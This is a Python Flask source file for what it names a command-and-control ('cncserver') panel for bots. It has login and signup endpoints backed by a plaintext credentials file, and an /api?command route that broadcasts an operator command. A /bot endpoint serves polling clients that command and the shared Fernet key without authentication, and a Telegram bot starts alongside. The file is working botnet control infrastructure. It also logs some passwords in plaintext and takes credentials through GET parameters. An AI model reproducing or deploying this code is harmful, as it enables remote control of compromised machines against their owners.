import logging, string, random, time, threading, flask
from datetime import datetime
from flask import request, jsonify
from functions import *
from telegram_bot import run_bot


def setup():
  global host, port, currentuser, command, log, app, key, fernetkey, homeviews, panelviews, apiviews
  host = loadconfig()['host']
  port = loadconfig()['port']

  currentuser = loadconfig()['currentuser']
  command = loadconfig()['command']

  log = logging.getLogger(loadconfig()['log'])
  log.disabled = True

  app = flask.Flask(__name__)
  app.config["DEBUG"] = loadconfig()['debug']

  key = getkey(10)
  fernetkey = getfernetkey()

  homeviews = 0
  panelviews = 0
  apiviews = 0


setup()


def view(page):
  if page == "home":
    global homeviews
    homeviews = homeviews + 1
  elif page == "panel":
    global panelviews
    panelviews = panelviews + 1
  elif page == "api":
    global apiviews
    apiviews = apiviews + 1


@app.route("/panel", methods=["GET"])
def panel():
  view("panel")
  ip_addr = request.environ["REMOTE_ADDR"]
  with open("html/panel.html", "r") as f:
    html = f.read()
  return html.replace("{currentuser}", currentuser)


@app.route("/", methods=["GET"])
def home():
  view("home")
  ip_addr = request.environ["REMOTE_ADDR"]
  if "key" in request.args:
    if request.args["key"] == key:
      print(
        f"({host}/) ({ip_addr}) ({datetime.now()})\n└── {currentuser} used valid key - {request.args['key']}"
      )
      view("panel")
      with open("html/panel.html", "r") as f:
        html = f.read()
      return html.replace("{currentuser}", currentuser)
    else:
      print(
        f"({host}/) ({ip_addr}) ({datetime.now()})\n└── {currentuser} used invalid key - {request.args['key']}"
      )
      return "invalid key"
  else:
    with open("html/index.html", "r") as f:
      html = f.read()
    return html


@app.route("/api", methods=["GET"])
def api():
  view("api")
  ip_addr = request.environ["REMOTE_ADDR"]
  if "signin" in request.args:
    usrpass = request.args["signin"]
    username, password = usrpass.split(":")
    print(
      f"({host}/api?signin) ({ip_addr}) ({datetime.now()})\n├── recived signin info - {username}:{(fernetencode(password, fernetkey)).decode('UTF-8')}"
    )
    authlist = open("logins").read().splitlines()
    if usrpass in authlist:
      global key
      key = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=10))
      print(
        f"└── user authenticated - {username}:{(fernetencode(password, fernetkey)).decode('UTF-8')}"
      )
      global currentuser
      currentuser, currentpass = usrpass.split(":")
      return f"OK:{key}"
    else:
      print(f"└── invalid credentals - {username}:{password}")
      return "INVALID"
  elif "signup" in request.args:
    usrpass = request.args["signup"]
    username, password = usrpass.split(":")
    print(
      f"({host}/api?signup) ({ip_addr}) ({datetime.now()})\n├── recived signup info - {username}:{(fernetencode(password, fernetkey)).decode('UTF-8')}"
    )
    authlist = open("logins").read().splitlines()
    if usrpass in authlist:
      print(f"└── Account exists - {usrpass}")
      return "INVALID"
    else:
      for account in authlist:
        accusername, accpassword = account.split(":")
        if accusername == username:
          print(f"└── username taken - {username}")
          return "Username Taken"
        else:
          0
      with open("logins", "a") as logins:
        logins.write("\n")
        logins.write(usrpass)
      print(f"└── user added - {username}")
      return f"Account Created"
  elif "command" in request.args:
    global command
    command = request.args["command"]
    print(f"({host}/api?command)\n└── bot command set - {command}")
    time.sleep(10)
    command = "none"
    return "successful"
  else:
    return "404"


@app.route("/bot", methods=["GET"])
def bot():
  ip_addr = request.environ["REMOTE_ADDR"]
  if "fernetkey" in request.args:
    return fernetkey
  return command


@app.route("/stats", methods=["GET"])
def stats():
  ip_addr = request.environ["REMOTE_ADDR"]
  global homeviews, panelviews, apiviews
  if "type" in request.args:
    if request.args["type"] == "homeviews":
      return str(homeviews)
    elif request.args["type"] == "panelviews":
      return str(panelviews)
    elif request.args["type"] == "apiviews":
      return str(apiviews)
    else:
      return "invalid type"
  else:
    with open("html/stats.html", "r") as f:
      html = f.read()
    return html


def main():

  def cncserver():
    clear()
    print(banner(app.config["DEBUG"], host, port, key, fernetkey))
    app.run(host=host, port=port)

  cncserver = threading.Thread(target=cncserver)
  cncserver.start()
  telegram_bot = threading.Thread(target=run_bot)
  telegram_bot.start()
  input("")


main()
